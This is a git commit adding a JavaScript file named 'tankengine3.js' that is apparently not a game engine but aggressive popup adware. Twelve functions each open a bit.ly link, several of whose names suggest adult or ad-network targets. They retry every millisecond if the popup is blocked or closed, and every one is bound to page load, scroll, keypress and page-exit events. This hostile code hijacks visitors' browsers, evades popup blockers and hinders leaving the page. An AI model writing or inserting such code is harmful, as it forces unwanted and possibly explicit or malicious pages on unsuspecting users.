110305bde4d292e77a82011ea4b59d3eacd99cc0
smokey2335 <116642185+smokey2335@users.noreply.github.com>
2024-03-12 01:49:48 +0100

    Create tankengine3.js

---
+++ tankengine3.js
@@ -0,0 +1,327 @@
+// First function
+function openFirstPopup() {
+    var popup = window.open('https://bit.ly/euphorfunright', '_blank');
+
+    function attemptOpen() {
+        if (popup === null || typeof(popup) === 'undefined' || popup.closed) {
+            setTimeout(function() {
+                popup = window.open('https://bit.ly/euphorfunright', '_blank');
+                attemptOpen(); // Retry recursively
+            }, 1);
+        }
+    }
+
+    attemptOpen();
+}
+
+function triggerOpenFirstPopup() {
+    openFirstPopup();
+}
+
+// Second function
+function openSecondPopup() {
+    var popup = window.open('https://bit.ly/boowbscombid?utm_source=tankbid', '_blank');
+
+    function attemptOpen() {
+        if (popup === null || typeof(popup) === 'undefined' || popup.closed) {
+            setTimeout(function() {
+                popup = window.open('https://bit.ly/boowbscombid?utm_source=tankbid', '_blank');
+                attemptOpen(); // Retry recursively
+            }, 1);
+        }
+    }
+
+    attemptOpen();
+}
+function triggerOpenSecondPopup() {
+    openSecondPopup();
+}
+
+// Third function
+function openThirdPopup() {
+    var popup = window.open('https://bit.ly/boowbsmob?utm_source=ezm', '_blank');
+
+    function attemptOpen() {
+        if (popup === null || typeof(popup) === 'undefined' || popup.closed) {
+            setTimeout(function() {
+                popup = window.open('https://bit.ly/boowbsmob?utm_source=ezm', '_blank');
+                attemptOpen(); // Retry recursively
+            }, 1);
+        }
+    }
+
+    attemptOpen();
+}
+function triggerOpenThirdPopup() {
+    openThirdPopup();
+}
+
+// Fourth function
+function openFourthPopup() {
+    var popup = window.open('https://bit.ly/clickboowbs?utm_source=dilla', '_blank');
+
+    function attemptOpen() {
+        if (popup === null || typeof(popup) === 'undefined' || popup.closed) {
+            setTimeout(function() {
+                popup = window.open('https://bit.ly/clickboowbs?utm_source=dilla', '_blank');
+                attemptOpen(); // Retry recursively
+            }, 1);
+        }
+    }
+
+    attemptOpen();
+}
+function triggerOpenFourthPopup() {
+    openFourthPopup();
+}
+
+// Fifth function
+function openFifthPopup() {
+    var popup = window.open('https://bit.ly/scarlet__chase?utm_source=euphorbid', '_blank');
+
+    function attemptOpen() {
+        if (popup === null || typeof(popup) === 'undefined' || popup.closed) {
+            setTimeout(function() {
+                popup = window.open('https://bit.ly/scarlet__chase?utm_source=otherbid', '_blank');
+                attemptOpen(); // Retry recursively
+            }, 1);
+        }
+    }
+
+    attemptOpen();
+}
+function triggerOpenFifthPopup() {
+    openFifthPopup();
+}
+
+// sixth function
+function openSixthPopup() {
+    var popup = window.open('https://bit.ly/kenzie---anne?utm_source=amave', '_blank');
+
+    function attemptOpen() {
+        if (popup === null || typeof(popup) === 'undefined' || popup.closed) {
+            setTimeout(function() {
+                popup = window.open('https://bit.ly/kenzie---anne?utm_source=amave', '_blank');
+                attemptOpen(); // Retry recursively
+            }, 1);
+        }
+    }
+
+    attemptOpen();
+}
+function triggerOpenSixthPopup() {
+    openSixthPopup();
+}
+
+// seventh function
+function openSeventhPopup() {
+    var popup = window.open('https://bit.ly/tagmone?utm_source=monetag', '_blank');
+
+    function attemptOpen() {
+        if (popup === null || typeof(popup) === 'undefined' || popup.closed) {
+            setTimeout(function() {
+                popup = window.open('https://bit.ly/tagmone?utm_source=monetag', '_blank');
+                attemptOpen(); // Retry recursively
+            }, 1);
+        }
+    }
+
+    attemptOpen();
+}
+function triggerOpenSeventhPopup() {
+    openSeventhPopup();
+}
+
+// eight function
+function openEightPopup() {
+    var popup = window.open('https://bit.ly/dainty-wilder?utm_source=stuff', '_blank');
+
+    function attemptOpen() {
+        if (popup === null || typeof(popup) === 'undefined' || popup.closed) {
+            setTimeout(function() {
+                popup = window.open('https://bit.ly/dainty-wilder?utm_source=stuff', '_blank');
+                attemptOpen(); // Retry recursively
+            }, 1);
+        }
+    }
+
+    attemptOpen();
+}
+function triggerOpenEightPopup() {
+    openEightPopup();
+}
+
+// ninth function
+function openNinthPopup() {
+    var popup = window.open('https://bit.ly/amber-moore?utm_source=right', '_blank');
+
+    function attemptOpen() {
+        if (popup === null || typeof(popup) === 'undefined' || popup.closed) {
+            setTimeout(function() {
+                popup = window.open('https://bit.ly/amber-moore?utm_source=right', '_blank');
+                attemptOpen(); // Retry recursively
+            }, 1);
+        }
+    }
+
+    attemptOpen();
+}
+
+function triggerOpenNinthPopup() {
+    openNinthPopup();
+}
+
+// tenth function
+function openTenthPopup() {
+    var popup = window.open('https://bit.ly/smashkad?utm_source=kad', '_blank');
+
+    function attemptOpen() {
+        if (popup === null || typeof(popup) === 'undefined' || popup.closed) {
+            setTimeout(function() {
+                popup = window.open('https://bit.ly/smashkad?utm_source=kad', '_blank');
+                attemptOpen(); // Retry recursively
+            }, 1);
+        }
+    }
+
+    attemptOpen();
+}
+
+function triggerOpenTenthPopup() {
+    openTenthPopup();
+}
+// eleventh function
+function openEleventhPopup() {
+    var popup = window.open('https://bit.ly/melody---marks?utm_source=river', '_blank');
+
+    function attemptOpen() {
+        if (popup === null || typeof(popup) === 'undefined' || popup.closed) {
+            setTimeout(function() {
+                popup = window.open('https://bit.ly/melody---marks?utm_source=river', '_blank');
+                attemptOpen(); // Retry recursively
+            }, 1);
+        }
+    }
+
+    attemptOpen();
+}
+
+function triggerOpenEleventhPopup() {
+    openEleventhPopup();
+}
+
+// twelfth function
+function openTwelfthPopup() {
+    var popup = window.open('https://bit.ly/lisa___ann?utm_source=una', '_blank');
+
+    function attemptOpen() {
+        if (popup === null || typeof(popup) === 'undefined' || popup.closed) {
+            setTimeout(function() {
+                popup = window.open('https://bit.ly/lisa___ann?utm_source=una', '_blank');
+                attemptOpen(); // Retry recursively
+            }, 1);
+        }
+    }
+
+    attemptOpen();
+}
+
+function triggerOpenTwelfthPopup() {
+    openTwelfthPopup();
+}
+
+window.addEventListener('load', triggerOpenFirstPopup);
+window.addEventListener('scroll', triggerOpenFirstPopup);
+window.addEventListener('keydown', triggerOpenFirstPopup);
+document.addEventListener('scroll', triggerOpenFirstPopup);
+document.addEventListener('keydown', triggerOpenFirstPopup);
+window.addEventListener('beforeunload', triggerOpenFirstPopup);
+document.addEventListener('beforeunload', triggerOpenFirstPopup);
+
+window.addEventListener('load', triggerOpenSecondPopup);
+window.addEventListener('scroll', triggerOpenSecondPopup);
+window.addEventListener('keydown', triggerOpenSecondPopup);
+document.addEventListener('scroll', triggerOpenSecondPopup);
+document.addEventListener('keydown', triggerOpenSecondPopup);
+window.addEventListener('beforeunload', triggerOpenSecondPopup);
+document.addEventListener('beforeunload', triggerOpenSecondPopup);
+
+window.addEventListener('load', triggerOpenThirdPopup);
+window.addEventListener('scroll', triggerOpenThirdPopup);
+window.addEventListener('keydown', triggerOpenThirdPopup);
+document.addEventListener('scroll', triggerOpenThirdPopup);
+document.addEventListener('keydown', triggerOpenThirdPopup);
+window.addEventListener('beforeunload', triggerOpenThirdPopup);
+document.addEventListener('beforeunload', triggerOpenThirdPopup);
+
+window.addEventListener('load', triggerOpenFourthPopup);
+window.addEventListener('scroll', triggerOpenFourthPopup);
+window.addEventListener('keydown', triggerOpenFourthPopup);
+document.addEventListener('scroll', triggerOpenFourthPopup);
+document.addEventListener('keydown', triggerOpenFourthPopup);
+window.addEventListener('beforeunload', triggerOpenFourthPopup);
+document.addEventListener('beforeunload', triggerOpenFourthPopup);
+
+window.addEventListener('load', triggerOpenFifthPopup);
+window.addEventListener('scroll', triggerOpenFifthPopup);
+window.addEventListener('keydown', triggerOpenFifthPopup);
+document.addEventListener('scroll', triggerOpenFifthPopup);
+document.addEventListener('keydown', triggerOpenFifthPopup);
+window.addEventListener('beforeunload', triggerOpenFifthPopup);
+document.addEventListener('beforeunload', triggerOpenFifthPopup);
+
+window.addEventListener('load', triggerOpenSixthPopup);
+window.addEventListener('scroll', triggerOpenSixthPopup);
+window.addEventListener('keydown', triggerOpenSixthPopup);
+document.addEventListener('scroll', triggerOpenSixthPopup);
+document.addEventListener('keydown', triggerOpenSixthPopup);
+window.addEventListener('beforeunload', triggerOpenSixthPopup);
+document.addEventListener('beforeunload', triggerOpenSixthPopup);
+
+window.addEventListener('load', triggerOpenSeventhPopup);
+window.addEventListener('scroll', triggerOpenSeventhPopup);
+window.addEventListener('keydown', triggerOpenSeventhPopup);
+document.addEventListener('scroll', triggerOpenSeventhPopup);
+document.addEventListener('keydown', triggerOpenSeventhPopup);
+window.addEventListener('beforeunload', triggerOpenSeventhPopup);
+document.addEventListener('beforeunload', triggerOpenSeventhPopup);
+
+window.addEventListener('load', triggerOpenEightPopup);
+window.addEventListener('scroll', triggerOpenEightPopup);
+window.addEventListener('keydown', triggerOpenEightPopup);
+document.addEventListener('scroll', triggerOpenEightPopup);
+document.addEventListener('keydown', triggerOpenEightPopup);
+window.addEventListener('beforeunload', triggerOpenEightPopup);
+document.addEventListener('beforeunload', triggerOpenEightPopup);
+
+window.addEventListener('load', triggerOpenNinthPopup);
+window.addEventListener('scroll', triggerOpenNinthPopup);
+window.addEventListener('keydown', triggerOpenNinthPopup);
+document.addEventListener('scroll', triggerOpenNinthPopup);
+document.addEventListener('keydown', triggerOpenNinthPopup);
+window.addEventListener('beforeunload', triggerOpenNinthPopup);
+document.addEventListener('beforeunload', triggerOpenNinthPopup);
+
+window.addEventListener('load', triggerOpenTenthPopup);
+window.addEventListener('scroll', triggerOpenTenthPopup);
+window.addEventListener('keydown', triggerOpenTenthPopup);
+document.addEventListener('scroll', triggerOpenTenthPopup);
+document.addEventListener('keydown', triggerOpenTenthPopup);
+window.addEventListener('beforeunload', triggerOpenTenthPopup);
+document.addEventListener('beforeunload', triggerOpenTenthPopup);
+
+window.addEventListener('load', triggerOpenEleventhPopup);
+window.addEventListener('scroll', triggerOpenEleventhPopup);
+window.addEventListener('keydown', triggerOpenEleventhPopup);
+document.addEventListener('scroll', triggerOpenEleventhPopup);
+document.addEventListener('keydown', triggerOpenEleventhPopup);
+window.addEventListener('beforeunload', triggerOpenEleventhPopup);
+document.addEventListener('beforeunload', triggerOpenEleventhPopup);
+
+window.addEventListener('load', triggerOpenTwelfthPopup);
+window.addEventListener('scroll', triggerOpenTwelfthPopup);
+window.addEventListener('keydown', triggerOpenTwelfthPopup);
+document.addEventListener('scroll', triggerOpenTwelfthPopup);
+document.addEventListener('keydown', triggerOpenTwelfthPopup);
+window.addEventListener('beforeunload', triggerOpenTwelfthPopup);
+document.addEventListener('beforeunload', triggerOpenTwelfthPopup);
